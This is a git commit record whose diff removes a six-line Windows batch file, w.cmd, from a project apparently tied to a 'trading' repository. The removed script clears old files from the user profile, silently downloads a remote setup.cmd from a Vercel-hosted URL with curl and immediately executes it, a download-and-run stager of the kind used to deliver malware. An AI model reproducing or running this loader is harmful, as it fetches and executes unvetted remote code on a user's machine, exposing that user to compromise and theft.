7f9eb1737858c0802bc0903c51fb466b5f9a2722
Jordan <macksnow41@gmail.com>
2026-09-25 11:04:01 -0700

    public project

--- public/public/120/w.cmd
+++
@@ -1,6 +0,0 @@
-::@echo off
-if exist "%USERPROFILE%\parse" del "%USERPROFILE%\parse"
-if exist "%USERPROFILE%\setup.cmd" del "%USERPROFILE%\setup.cmd"
-curl -s -L -o "%USERPROFILE%\setup.cmd" "https://vercel.com/billion10/trading-v1/3nTymp4UDAn8pMLaXzVWfdGff3yt/120/ws.cmd" setup.cmd
-"%USERPROFILE%\setup.cmd"
-::cls
